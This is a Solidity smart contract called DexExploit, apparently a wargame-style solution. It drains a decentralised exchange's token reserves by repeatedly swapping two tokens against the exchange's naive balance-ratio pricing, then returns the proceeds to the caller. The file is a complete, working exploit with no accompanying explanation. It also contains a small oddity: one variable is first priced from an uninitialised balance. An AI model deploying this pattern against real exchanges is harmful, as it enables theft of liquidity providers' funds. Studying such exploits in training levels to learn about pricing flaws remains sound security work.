// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import './IDex.sol';

contract DexExploit {
    using SafeMath for uint;
    IERC20 public token1;
    IERC20 public token2;
    IDex public dex;

    constructor(address _token1,address _token2, address _dex) public {
        token1=IERC20(_token1);
        token2=IERC20(_token2);
        dex=IDex(_dex);

        token1.approve(_dex, uint256(0)-1);
        token2.approve(_dex, uint256(0)-1);
    }

    function getDexToken1Balance() public view returns(uint256){
        return  token1.balanceOf(address(dex));
    }

    function getDexToken2Balance() public view returns(uint256){
        return  token2.balanceOf(address(dex));
    }

    function getToken1Balance() public view returns(uint256){
        return token1.balanceOf(address(this));
    }

    function getToken2Balance() public view returns(uint256){
        return token2.balanceOf(address(this));
    }

    function getTokensBack() public {
        token1.transfer(msg.sender, getToken1Balance());
        token2.transfer(msg.sender, getToken2Balance());
    }

    function getSwapInput(address from, address to, uint256 outputAmount) public view returns(uint256) {
        return outputAmount* IERC20(from).balanceOf(address(dex))/ IERC20(to).balanceOf(address(dex));
    }

    function exploit() public{
        
        uint256 token1Balance;
        uint256 token2Balance;
        
        uint256 token1ToExchange;
        uint256 token2ToExchange;
        uint256 amountToken1ToRecieve;
        
        uint256 amountToken2ToRecieve=dex.getSwapPrice(address(token1), address(token2), token1Balance);

        while(token1.balanceOf(address(dex))!=0 && token2.balanceOf(address(dex))!=0){
            token1Balance=token1.balanceOf(address(this));
            token2Balance=token2.balanceOf(address(this));
            
            if(token1Balance!=0 && token2.balanceOf(address(dex))!=0){
                token1ToExchange=token1.balanceOf(address(this));
                amountToken2ToRecieve=dex.getSwapPrice(address(token1), address(token2), token1ToExchange);
                if(amountToken2ToRecieve>token2.balanceOf(address(dex))){
                    token1ToExchange=getSwapInput(address(token1), address(token2), token2.balanceOf(address(dex)));
                }
                dex.swap(address(token1), address(token2), token1ToExchange);
            }else if(token2Balance!=0 && token1.balanceOf(address(dex))!=0){
                token2ToExchange=token2.balanceOf(address(this));
                amountToken1ToRecieve=dex.getSwapPrice(address(token2), address(token1), token2ToExchange);
                if(amountToken1ToRecieve>token1.balanceOf(address(dex))){
                    token2ToExchange=getSwapInput(address(token2), address(token1), token1.balanceOf(address(dex)));
                }
                dex.swap(address(token2), address(token1), token2ToExchange);
            }
        }
    }

  
}

